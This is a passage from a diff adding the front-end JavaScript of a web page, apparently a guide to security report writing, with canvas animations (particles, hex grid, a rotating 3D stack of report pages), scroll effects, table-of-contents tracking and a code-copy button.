+    reset(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;const r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255'}
+    update(){const dx=this.x-mouseX,dy=this.y-mouseY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){const f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false)}
+    draw(){const a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle=`rgba(${this.color},${a})`;ctx.fill()}
+  }
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function drawLines(){for(let i=0;i<P.length;i++)for(let j=i+1;j<P.length;j++){const a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){const al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,`rgba(${a.color},${al})`);g.addColorStop(1,`rgba(${b.color},${al})`);ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke()}}}
+  function drawRing(){const g=ctx.createRadialGradient(mouseX,mouseY,0,mouseX,mouseY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mouseX,mouseY,80,0,Math.PI*2);ctx.fill()}
+  function animate(){ctx.clearRect(0,0,W,H);drawRing();drawLines();P.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',e=>{mouseX=e.clientX;mouseY=e.clientY});
+  P=Array.from({length:N},()=>new Particle());animate();
+})();
+
+/* HEX GRID */
+(function(){
+  const c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  let W,H,t=0;const S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function hexPath(cx,cy,s){ctx.beginPath();for(let i=0;i<6;i++){const a=Math.PI/180*(60*i-30);i===0?ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a)):ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a))}ctx.closePath()}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;const sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(let r=-1;r<rows;r++)for(let col=-1;col<cols;col++){const cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%((S*1.5));const w=Math.sin(t+col*.3+r*.2)*.5+.5;hexPath(cx,cy,S-2);ctx.strokeStyle=`rgba(0,255,65,${.02+w*.07})`;ctx.lineWidth=.6;ctx.stroke();if(w>.92){hexPath(cx,cy,S-2);ctx.fillStyle=`rgba(0,255,65,${.02+w*.03})`;ctx.fill()}}requestAnimationFrame(draw)}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+
+/* HERO 3D — CASCADING REPORT STACK */
+(function(){
+  const c=document.getElementById('hero-geo');if(!c)return;
+  const ctx=c.getContext('2d'),S=500;c.width=S;c.height=S;
+
+  // 6 stacked document pages — cascading in 3D space
+  const pages=[
+    {w:200,h:260,x:0,  y:-80,z:0,   col:'0,255,65',  label:'REPORT',    off:0},
+    {w:200,h:260,x:8,  y:-70,z:-15, col:'0,229,255',  label:'FINDINGS',  off:1},
+    {w:200,h:260,x:16, y:-60,z:-30, col:'191,0,255',  label:'EVIDENCE',  off:2},
+    {w:200,h:260,x:24, y:-50,z:-45, col:'255,215,0',  label:'REMEDIATION',off:3},
+    {w:200,h:260,x:32, y:-40,z:-60, col:'255,0,60',   label:'APPENDIX',  off:4},
+  ];
+
+  // Animated text lines on front page
+  const lines=[
+    {y:-60,w:0.7,col:'0,255,65'},
+    {y:-40,w:0.5,col:'0,229,255'},
+    {y:-20,w:0.8,col:'0,255,65'},
+    {y:0,  w:0.4,col:'0,229,255'},
+    {y:20, w:0.6,col:'0,255,65'},
+    {y:40, w:0.3,col:'0,229,255'},
+    {y:60, w:0.7,col:'0,255,65'},
+  ];
+
+  let rx=0,ry=0,mrx=0,mry=0,t=0;
+  document.addEventListener('mousemove',e=>{mrx=(e.clientY/innerHeight-.5)*.25;mry=(e.clientX/innerWidth-.5)*.35});
+
+  function rot([x,y,z],rx,ry){
+    let y1=y*Math.cos(rx)-z*Math.sin(rx),z1=y*Math.sin(rx)+z*Math.cos(rx);
+    let x2=x*Math.cos(ry)+z1*Math.sin(ry),z2=-x*Math.sin(ry)+z1*Math.cos(ry);
+    return[x2,y1,z2];
+  }
+  function proj([x,y,z]){const f=460,d=f/(f+z+200);return[x*d+S/2,y*d+S/2,z]}
+
+  function drawPage(pg,rx,ry,idx,t){
+    const hw=pg.w/2,hh=pg.h/2;
+    const corners=[[-hw,-hh,0],[hw,-hh,0],[hw,hh,0],[-hw,hh,0]];
+    const pts=corners.map(([cx,cy,cz])=>proj(rot([cx+pg.x,cy+pg.y,cz+pg.z],rx,ry)));
+    const dep=(pts.reduce((s,p)=>s+p[2],0)/4+200)/400;
+    const al=0.06+dep*.35;
+    // Page fill
+    ctx.beginPath();ctx.moveTo(pts[0][0],pts[0][1]);
+    pts.slice(1).forEach(p=>ctx.lineTo(p[0],p[1]));ctx.closePath();
+    ctx.fillStyle=`rgba(${pg.col},${al*0.15})`;ctx.fill();
+    ctx.strokeStyle=`rgba(${pg.col},${al})`;ctx.lineWidth=0.8+dep*0.5;ctx.stroke();
+    // Page fold corner (top right)
+    const foldSize=16*dep;
+    const tr=pts[1],br=pts[2],tl=pts[0];
+    const foldX=tr[0]+(tl[0]-tr[0])*foldSize/pg.w;
+    const foldY=tr[1]+(br[1]-tr[1])*foldSize/pg.h;
+    ctx.beginPath();ctx.moveTo(tr[0],tr[1]);ctx.lineTo(foldX,foldY);ctx.lineTo(tr[0],tr[1]+(br[1]-tr[1])*foldSize/pg.h);
+    ctx.strokeStyle=`rgba(${pg.col},${al*0.6})`;ctx.lineWidth=0.5;ctx.stroke();
+    // Text lines on front page only
+    if(idx===0){
+      lines.forEach((ln,li)=>{
+        const lineY=pg.y+ln.y;
+        const lx=-hw*0.7;
+        const rx2=hw*0.7*ln.w;
+        const pulse=(Math.sin(t*0.8+li*0.6)*.5+.5);
+        const lp1=proj(rot([lx,lineY,0],rx,ry));
+        const lp2=proj(rot([lx+2*hw*0.7*ln.w,lineY,0],rx,ry));
+        const ld=(lp1[2]+200)/400;
+        ctx.beginPath();ctx.moveTo(lp1[0],lp1[1]);ctx.lineTo(lp2[0],lp2[1]);
+        ctx.strokeStyle=`rgba(${ln.col},${ld*(0.15+pulse*0.12)})`;ctx.lineWidth=1.5*ld;ctx.stroke();
+      });
+      // Severity dots on front page (red/orange/yellow/cyan/green)
+      const sevCols=['255,0,60','255,148,0','255,215,0','0,229,255','0,255,65'];
+      sevCols.forEach((col,si)=>{
+        const dotY=pg.y+80+si*18-40;
+        const dotX=-hw*0.6;
+        const dp=proj(rot([dotX,dotY,0],rx,ry));
+        const dd=(dp[2]+200)/400;
+        const pulse2=(Math.sin(t*1.2+si*0.8)*.5+.5);
+        ctx.beginPath();ctx.arc(dp[0],dp[1],3*dd,0,Math.PI*2);
+        ctx.fillStyle=`rgba(${col},${dd*(0.4+pulse2*0.4)})`;ctx.fill();
+      });
+    }
+    return dep;
+  }
+
+  function draw(){
+    ctx.clearRect(0,0,S,S);
+    rx+=.003+mrx*.007;ry+=.005+mry*.01;t+=0.018;
+    // Draw back to front
+    [...pages].reverse().forEach((pg,i)=>drawPage(pg,rx,ry,pages.length-1-i,t));
+    // Scanner line sweeping across front page
+    const scan=(t*0.4)%1;
+    const sy=pages[0].y-pages[0].h/2+pages[0].h*scan;
+    const sl1=proj(rot([-pages[0].w/2,sy,0],rx,ry));
+    const sl2=proj(rot([pages[0].w/2,sy,0],rx,ry));
+    ctx.beginPath();ctx.moveTo(sl1[0],sl1[1]);ctx.lineTo(sl2[0],sl2[1]);
+    ctx.strokeStyle=`rgba(0,255,65,${0.25*(1-Math.abs(scan-0.5)*2)})`;ctx.lineWidth=1.5;ctx.stroke();
+    // Central glow
+    const cg=ctx.createRadialGradient(S/2,S/2,0,S/2,S/2,60);
+    cg.addColorStop(0,'rgba(0,255,65,0.06)');cg.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=cg;ctx.beginPath();ctx.arc(S/2,S/2,60,0,Math.PI*2);ctx.fill();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* 3D TILT ON SECTION CARDS */
+document.querySelectorAll('.vc').forEach(card=>{
+  card.addEventListener('mousemove',e=>{
+    const r=card.getBoundingClientRect(),x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;
+    card.style.transform=`perspective(700px) rotateX(${-y*14}deg) rotateY(${x*14}deg) translateZ(10px) scale(1.03)`;
+    card.style.boxShadow=`${-x*20}px ${-y*20}px 40px rgba(0,229,255,.18),0 20px 50px rgba(0,0,0,.4)`;
+  });
+  card.addEventListener('mouseleave',()=>{
+    card.style.transform='perspective(700px) rotateX(0) rotateY(0) translateZ(0) scale(1)';
+    card.style.boxShadow='';card.style.transition='transform .4s,box-shadow .4s';
+    setTimeout(()=>card.style.transition='',400);
+  });
+});
+
+/* SCROLL REVEAL */
+const rv=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('on')}),{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(el=>rv.observe(el));
+
+/* TOC TRACKING */
+const sIds=['hero','why','structure','findings','severity','post','tools','ai','best'];
+const tItems=document.querySelectorAll('.toc-i');
+const so=new IntersectionObserver(e=>{e.forEach(x=>{if(x.isIntersecting)tItems.forEach(t=>t.classList.toggle('active',t.dataset.s===x.target.id))})},{threshold:.25});
+sIds.forEach(id=>{const el=document.getElementById(id);if(el)so.observe(el)});
+function goTo(h){document.querySelector(h)?.scrollIntoView({behavior:'smooth'})}
+
+/* CODE COPY */
+document.querySelectorAll('.cb').forEach(b=>{
+  b.title='Click to copy';
+  b.addEventListener('click',()=>{
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(()=>{});
+    const o=b.getAttribute('data-l');b.setAttribute('data-l',o+' ✓ COPIED');
+    setTimeout(()=>b.setAttribute('data-l',o),2000);
+  });
+});
+</script>
+</body>
+</html>
